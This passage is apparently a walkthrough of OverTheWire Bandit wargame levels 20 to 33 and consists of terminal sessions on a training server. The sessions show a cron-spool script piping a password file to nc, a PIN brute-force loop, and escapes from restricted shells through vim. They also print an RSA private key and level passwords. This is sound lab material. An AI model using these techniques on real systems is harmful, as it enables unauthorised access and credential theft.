Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
bandit20@bandit:~$
─────────────────────────
bandit20@bandit:~$
bandit20@bandit:~$ nc -l -p 1337
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
bandit20@bandit:~$
^d
^d
bandit20@bandit $ tmux
[exited]
bandit20@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## Bandit21

```bash
bandit21@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit21@bandit.labs.overthewire.orgs password:

  
bandit21@bandit $ cat /etc/cron.d/*
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit21@bandit $ cat /usr/bin/cronjob_bandit2*
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat: /usr/bin/cronjob_bandit23.sh: Permission denied
cat: /usr/bin/cronjob_bandit24.sh: Permission denied
bandit21@bandit $ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

## bandit22

```bash
bandit22@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit22@bandit.labs.overthewire.orgs password:

bandit22@bandit $ cat /etc/cron.d/*
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit22@bandit $ cat /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget

bandit22@bandit $ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
bandit22@bandit $ echo $mytarget
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit $ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n<
bandit22@bandit $ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit23

```bash
bandit23@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit23@bandit.labs.overthewire.orgs password:


bandit23@bandit $ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
  echo "Handling $i"
  timeout -s 9 60 ./$i
  rm -f ./$i
    fi
done

bandit23@bandit $ ls /var/spool/
bandit24  cron  mail  rsyslog
bandit23@bandit $ ls /var/spool/bandit24/


bandit23@bandit $ mkdir /tmp/giv_pass
bandit23@bandit $ cd /tmp/giv_pass
bandit23@bandit:/tmp/giv_pass$ touch give_pass.sh
bandit23@bandit:/tmp/giv_pass$ vim give_pass.sh/<
```

```bash
#/bin/bash
cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 1337
```

```bash
bandit23@bandit:/tmp/giv_pass$ tmux
CTRL + B SHIFT "
bandit23@bandit:/tmp/giv_pass$ cp give_pass.sh /var/spool/bandit24/give_pass.sh
bandit23@bandit:/tmp/giv_pass$
────────────────────────────────────
bandit23@bandit:/tmp/giv_pass$nc -l -p 1337
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

^d 
^d 
bandit23@bandit:/tmp/giv_pass$ tmux
[exited]
bandit23@bandit:/tmp/giv_pass$ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit24

```bash
bandit24@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit24@bandit.labs.overthewire.orgs password:


bandit24@bandit $ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.


bandit24@bandit $ mkdir /tmp/brute_port
bandit24@bandit $ cd /tmp/brute_port
bandit24@bandit:/tmp/brute_port$ 
bandit24@bandit:/tmp/brute_port$ touch brute_port.sh
bandit24@bandit:/tmp/brute_port$ chmod +x brute_port.sh
bandit24@bandit:/tmp/brute_port$ vim brute_port.sh 
#/bin/bash
for i in {0000..9999}
do
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i
done

bandit24@bandit:/tmp/brute_port$ nc 127.0.0.1 30002 < list | grep -v 'Wrong! Please enter the correct pincode. Try again.'
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
bandit24@bandit:/tmp/brute_port$ logout
Connection to bandit.labs.overthewire.org closed.
```

## bandit25

```bash
bandit25@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit25@bandit.labs.overthewire.orgs password:


bandit25@bandit $ cat /etc/passwd |grep bandit26

bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit $ ls -la
total 32
drwxr-xr-x  2 root     root     4096 Aug  3 19:14 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rw-r-----  1 bandit25 bandit25   33 Aug  3 19:14 .bandit24.password
-r--------  1 bandit25 bandit25 1679 Oct 16  2018 bandit26.sshkey
bandit25@bandit $ cat bandit26.sshkey 
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
bandit25@bandit $ logout
Connection to bandit.labs.overthewire.org closed.

/wargames/overthewire/bandit$ mkdir bandit26

/wargames/overthewire/bandit$ vim bandit26/id_rsa

/wargames/overthewire/bandit$ chmod 0400 bandit26/id_rsa

wargames/overthewire/banditbandit26@bandit.labs.overthewire.org -p 2220 -i bandit26/id_rsa
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames



  _   _ _ _   ___   __
 | |       | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to bandit.labs.overthewire.org closed.

/wargames/overthewire/bandit$ bandit25@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no 
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit25@bandit.labs.overthewire.orgs password:

bandit25@bandit $ /usr/bin/showtext 
more: stat of /home/bandit25/text.txt failed: No such file or directory>

bandit25@bandit $ strace /usr/bin/showtext 
execve("/usr/bin/showtext", ["/usr/bin/showtext"], [/* 26 vars */]) = 0
brk(NULL) = 0x557a08cc3000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=35184, ...}) = 0
mmap(NULL, 35184, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fe1abf31000
close(3)  = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\4\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1689360, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fe1abf2f000
mmap(NULL, 3795296, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fe1ab978000
mprotect(0x7fe1abb0d000, 2097152, PROT_NONE) = 0
mmap(0x7fe1abd0d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x195000) = 0x7fe1abd0d000
mmap(0x7fe1abd13000, 14688, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fe1abd13000
close(3)  = 0
arch_prctl(ARCH_SET_FS, 0x7fe1abf30480) = 0
mprotect(0x7fe1abd0d000, 16384, PROT_READ) = 0
mprotect(0x557a07eb9000, 8192, PROT_READ) = 0
mprotect(0x7fe1abf3a000, 4096, PROT_READ) = 0
munmap(0x7fe1abf31000, 35184)     = 0
getpid()  = 5008
rt_sigaction(SIGCHLD, {sa_handler=0x557a07cafef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0
geteuid() = 11025
brk(NULL) = 0x557a08cc3000
brk(0x557a08ce4000)   = 0x557a08ce4000
getppid() = 5006
stat("/home/bandit25", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
stat(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
open("/usr/bin/showtext", O_RDONLY)     = 3
fcntl(3, F_DUPFD, 10)       = 10
close(3)  = 0
fcntl(10, F_SETFD, FD_CLOEXEC)    = 0
rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGINT, {sa_handler=0x557a07cafef0, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0
rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0
rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=SA_RESTORER, sa_restorer=0x7fe1ab9ab060}, NULL, 8) = 0
read(10, "#!/bin/sh\n\nexport TERM=linux\n\nmo"..., 8192) = 53
stat("/usr/local/bin/more", 0x7ffce0457a00) = -1 ENOENT (No such file or directory)
stat("/usr/bin/more", 0x7ffce0457a00)   = -1 ENOENT (No such file or directory)
stat("/bin/more", {st_mode=S_IFREG|0755, st_size=39736, ...}) = 0
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fe1abf30750) = 5009
wait4(-1, more: stat of /home/bandit25/text.txt failed: No such file or directory
[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 5009
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=5009, si_uid=11025, si_status=0, si_utime=0, si_stime=0} ---
rt_sigreturn({mask=[]})     = 5009
exit_group(0)   = ?
+++ exited with 0 +++



....  
stat("/usr/local/bin/more", 0x7ffc5ab62220) = -1 ENOENT (No such file or directory)
stat("/usr/bin/more", 0x7ffc5ab62220)   = -1 ENOENT (No such file or directory)
stat("/bin/more", {st_mode=S_IFREG|0755, st_size=39736, ...}) = 0
....  
wait4(-1, more: stat of /home/bandit25/text.txt failed: No such file or directory
....  

bandit25@bandit $ cat /usr/bin/showtext 
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0


bandit25@bandit $ more

Usage:
 more [options] <file>...

A file perusal filter for CRT viewing.

Options:
 -d    display help instead of ringing bell
 -f    count logical rather than screen lines
 -l    suppress pause after form feed
 -c    do not scroll, display text and clean line ends
 -p    do not scroll, clean screen and display text
 -s    squeeze multiple blank lines into one
 -u    suppress underlining
 -<number>   the number of lines per screenful
 +<number>   display file beginning from line number
 +/<string>  display file beginning from search string match
 -V    display version information and exit

For more details see more(1).

* RESIZE WINDOW **

bandit25@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no

 _   _ _ _   ___   __  
 | |       | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
--More--(83%)

**press v for vim *
:set shell=/bin/bash
:shell

bandit26@bandit:~$ 
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```

## bandit27

```bash
bandit26@bandit:~$ ls -la
total 36
drwxr-xr-x  3 root     root     4096 Oct 16  2018 .
drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
-rwsr-x---  1 bandit27 bandit26 7296 Oct 16  2018 bandit27-do
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-rw-r--r--  1 root     root      675 May 15  2017 .profile
drwxr-xr-x  2 root     root     4096 Oct 16  2018 .ssh
-rw-r-----  1 bandit26 bandit26  258 Oct 16  2018 text.txt
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```

## bandit28

```bash
bandit26@bandit:$ mkdir /tmp/giv_git
bandit26@bandit:$ cd /tmp/giv_git
bandit26@bandit:/tmp/giv_pass$ 
bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo.git
Cloning into 'repo'...
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit27-git@localhost's password: 
remote: Counting objects: 3, done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (3/3), done.
bandit26@bandit:/tmp/giv_git$ ls
repo
bandit26@bandit:/tmp/giv_git$ cd repo/
bandit26@bandit:/tmp/giv_git/repo$ ls
README
bandit26@bandit:/tmp/giv_git/repo$ cat README 
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2 
```

## bandit28

```bash
bandit26@bandit:/tmp/giv_git/repo$ cd ..
bandit26@bandit:/tmp/giv_git$ rm repo/ -rf
bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo.git
Cloning into 'repo'...
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit28-git@localhost's password: 
remote: Counting objects: 9, done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0)
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.
bandit26@bandit:/tmp/giv_git$ ls
repo
bandit26@bandit:/tmp/giv_git$ cd repo/
bandit26@bandit:/tmp/giv_git/repo$ ls -la
total 16
drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:11 .
drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:11 ..
drwxr-sr-x 8 bandit26 root 4096 Sep 11 17:11 .git
-rw-r--r-- 1 bandit26 root  111 Sep 11 17:11 README.md
bandit26@bandit:/tmp/giv_git/repo$ git log
commit 073c27c130e6ee407e12faad1dd3848a110c4f95
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    fix info leak

commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    add missing data

commit b67405defc6ef44210c53345fc953e6a21338cc7
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    initial commit of README.md
bandit26@bandit:/tmp/giv_git/repo$ git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
Note: checking out '186a1038cc54d1358d42d468cdc8e3cc28a93fcb'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at 186a103... add missing data
bandit26@bandit:/tmp/giv_git/repo$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: bbc96594b4e001778eee9975372716b2

bandit26@bandit:/tmp/giv_git/repo$ git checkout b67405defc6ef44210c53345fc953e6a21338cc7
Previous HEAD position was 186a103... add missing data
HEAD is now at b67405d... initial commit of README.md
bandit26@bandit:/tmp/giv_git/repo$ cat README.md 
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: <TBD>
``` 

## bandit29

```bash
bandit26@bandit:/tmp/giv_git/repo$ cd ..
bandit26@bandit:/tmp/giv_git$ rm -rf repo/
bandit26@bandit:/tmp/giv_git$ 
bandit26@bandit:/tmp/giv_git$ git clone  ssh://bandit29-git@localhost/home/bandit29-git/repo
Cloning into 'repo'...
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit29-git@localhost's password: 
remote: Counting objects: 16, done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0)
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.
bandit26@bandit:/tmp/giv_git$ ls -la
total 2092
drwxr-sr-x     3 bandit26 root    4096 Sep 11 17:15 .
drwxrws-wt 18980 root     root 2129920 Sep 11 17:15 ..
drwxr-sr-x     3 bandit26 root    4096 Sep 11 17:15 repo
bandit26@bandit:/tmp/giv_git$ cd repo/
bandit26@bandit:/tmp/giv_git/repo$ ls -la
total 16
drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:15 .
drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:15 ..
drwxr-sr-x 8 bandit26 root 4096 Sep 11 17:15 .git
-rw-r--r-- 1 bandit26 root  131 Sep 11 17:15 README.md
bandit26@bandit:/tmp/giv_git/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>

bandit26@bandit:/tmp/giv_git/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev

bandit26@bandit:/tmp/giv_git/repo$ git checkout dev
Branch dev set up to track remote branch dev from origin.
Switched to a new branch 'dev'
bandit26@bandit:/tmp/giv_git/repo$ cat README.md 
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: 5b90576bedb2cc04c86a9e924ce42faf
``` 

## bandit30

```bash
bandit26@bandit:/tmp/giv_git/repo$ cd ..
bandit26@bandit:/tmp/giv_git$ rm -rf repo/
bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
Cloning into 'repo'...
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit30-git@localhost's password: 
remote: Counting objects: 4, done.
remote: Total 4 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (4/4), done.
bandit26@bandit:/tmp/giv_git$ 
bandit26@bandit:/tmp/giv_git$ ls
repo
bandit26@bandit:/tmp/giv_git$ cd repo/
bandit26@bandit:/tmp/giv_git/repo$ ls -la
total 16
drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:19 .
drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:18 ..
drwxr-sr-x 8 bandit26 root 4096 Sep 11 17:19 .git
-rw-r--r-- 1 bandit26 root   30 Sep 11 17:19 README.md
bandit26@bandit:/tmp/giv_git/repo$ cat README.md 
just an epmty file... muahaha
andit26@bandit:/tmp/giv_git/repo/.git$ git tag -l
secret
bandit26@bandit:/tmp/giv_git/repo/.git$ git show-ref --tags
f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret
bandit26@bandit:/tmp/giv_git/repo$ git show secret
47e603bb428404d265f59c42920d81e5
```


## bandit31 

```bash
bandit26@bandit:/tmp/giv_git/repo$ cd ..
bandit26@bandit:/tmp/giv_git$ rm -rf repo/
bandit26@bandit:/tmp/giv_git$ ssh://bandit31-git@localhost/home/bandit31-git/repo
bash: ssh://bandit31-git@localhost/home/bandit31-git/repo: No such file or directory
bandit26@bandit:/tmp/giv_git$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
Cloning into 'repo'...
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit31-git@localhost's password: 
remote: Counting objects: 4, done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 4 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (4/4), done.
bandit26@bandit:/tmp/giv_git$ 
bandit26@bandit:/tmp/giv_git$ ls 
repo
bandit26@bandit:/tmp/giv_git$ cd repo/
bandit26@bandit:/tmp/giv_git/repo$ ls -la
total 24
drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:37 .
drwxr-sr-x 3 bandit26 root 4096 Sep 11 17:36 ..
drwxr-sr-x 8 bandit26 root 4096 Sep 11 17:37 .git
-rw-r--r-- 1 bandit26 root    6 Sep 11 17:35 .gitignore
-rw-r--r-- 1 bandit26 root   15 Sep 11 17:37 key.txt
-rw-r--r-- 1 bandit26 root  147 Sep 11 17:35 README.md

bandit26@bandit:/tmp/giv_git/repo$ cat .gitignore 
*.txt

bandit26@bandit:/tmp/giv_git/repo$ cat README.md 
This time your task is to push a file to the remote repository.

Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master
bandit26@bandit:/tmp/giv_git/repo$ vim key.txt
May I come in?

bandit26@bandit:/tmp/giv_git/repo$  rm .gitignore
bandit26@bandit:/tmp/giv_git/repo$ git add key.txt 
bandit26@bandit:/tmp/giv_git/repo$ git commit -m "Added key.txt"

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: unable to auto-detect email address (got 'bandit26@bandit.(none)')
bandit26@bandit:/tmp/giv_git/repo$ git config user.email "you@example.com"
bandit26@bandit:/tmp/giv_git/repo$ git config user.name "you@example.com"
bandit26@bandit:/tmp/giv_git/repo$ git commit -m "Added key.txt"
[master 091067d] Added key.txt
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt
 
bandit26@bandit:/tmp/giv_git/repo$ git push
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit26/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit31-git@localhost's password: 
Counting objects: 3, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 317 bytes | 0 bytes/s, done.
Total 3 (delta 0), reused 0 (delta 0)
remote: ### Attempting to validate files... ####
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
remote: Well done! Here is the password for the next level:
remote: 56a9bf19c63d650ce78e6ec0354ee45e
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote: 
To ssh://localhost/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'
```

## bandit 32

```bash
ssh bandit32@bandit.labs.overthewire.org -p 2220
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit32@bandit.labs.overthewire.orgs password:

WELCOME TO THE UPPERCASE SHELL
>> $0
$ /bin/bash
bandit33@bandit:~$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
```

## bandit 33
Not out yet.